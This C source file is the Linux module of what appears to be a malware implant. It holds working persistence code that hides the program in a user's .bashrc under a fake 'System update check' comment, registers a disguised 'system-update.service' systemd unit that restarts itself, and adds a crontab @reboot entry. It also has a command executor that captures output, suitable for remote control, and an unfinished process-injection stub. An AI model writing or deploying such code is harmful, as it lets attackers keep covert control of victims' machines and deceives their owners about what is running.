/*
 * Linux-specific implementations
 */

#ifdef PLATFORM_LINUX

#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <pwd.h>
#include "../core/commands.h"
#include "../core/utils.h"

// Install persistence on Linux
int install_persistence_linux(void) {
    // Get current executable path
    char exe_path[512];
    ssize_t len = readlink("/proc/self/exe", exe_path, sizeof(exe_path) - 1);
    if (len < 0) {
        return -1;
    }
    exe_path[len] = '\0';
    
    // Get home directory
    const char* home = getenv("HOME");
    if (!home) {
        struct passwd* pw = getpwuid(getuid());
        if (pw) {
            home = pw->pw_dir;
        }
    }
    
    if (!home) {
        return -1;
    }
    
    // Method 1: Add to .bashrc
    char bashrc_path[512];
    snprintf(bashrc_path, sizeof(bashrc_path), "%s/.bashrc", home);
    
    FILE* fp = fopen(bashrc_path, "a");
    if (fp) {
        fprintf(fp, "\n# System update check\n");
        fprintf(fp, "nohup %s >/dev/null 2>&1 &\n", exe_path);
        fclose(fp);
    }
    
    // Method 2: Create systemd user service (if systemd is available)
    char service_dir[512];
    char service_file[512];
    
    snprintf(service_dir, sizeof(service_dir), "%s/.config/systemd/user", home);
    snprintf(service_file, sizeof(service_file), "%s/system-update.service", service_dir);
    
    // Create directory
    char mkdir_cmd[512];
    snprintf(mkdir_cmd, sizeof(mkdir_cmd), "mkdir -p %s", service_dir);
    system(mkdir_cmd);
    
    // Create service file
    fp = fopen(service_file, "w");
    if (fp) {
        fprintf(fp, "[Unit]\n");
        fprintf(fp, "Description=System Update Service\n");
        fprintf(fp, "After=network.target\n\n");
        fprintf(fp, "[Service]\n");
        fprintf(fp, "Type=simple\n");
        fprintf(fp, "ExecStart=%s\n", exe_path);
        fprintf(fp, "Restart=always\n");
        fprintf(fp, "RestartSec=30\n\n");
        fprintf(fp, "[Install]\n");
        fprintf(fp, "WantedBy=default.target\n");
        fclose(fp);
        
        // Enable service
        system("systemctl --user daemon-reload 2>/dev/null");
        system("systemctl --user enable system-update.service 2>/dev/null");
        system("systemctl --user start system-update.service 2>/dev/null");
    }
    
    // Method 3: Crontab
    char cron_cmd[512];
    snprintf(cron_cmd, sizeof(cron_cmd), 
            "(crontab -l 2>/dev/null; echo '@reboot %s') | crontab - 2>/dev/null",
            exe_path);
    system(cron_cmd);
    
    return 0;
}

// Linux process injection (basic implementation)
int inject_process_linux(const uint8_t* payload, size_t size, uint32_t pid) {
    // This is a complex operation requiring ptrace
    // For now, return not implemented
    (void)payload;
    (void)size;
    (void)pid;
    return -1;
}

// Execute command on Linux
int execute_command_linux(const char* cmd, char* output, size_t output_size) {
    FILE* fp = popen(cmd, "r");
    if (!fp) {
        return -1;
    }
    
    size_t total = 0;
    while (fgets(output + total, output_size - total, fp) != NULL) {
        total = strlen(output);
        if (total >= output_size - 1) {
            break;
        }
    }
    
    pclose(fp);
    return total;
}

#endif // PLATFORM_LINUX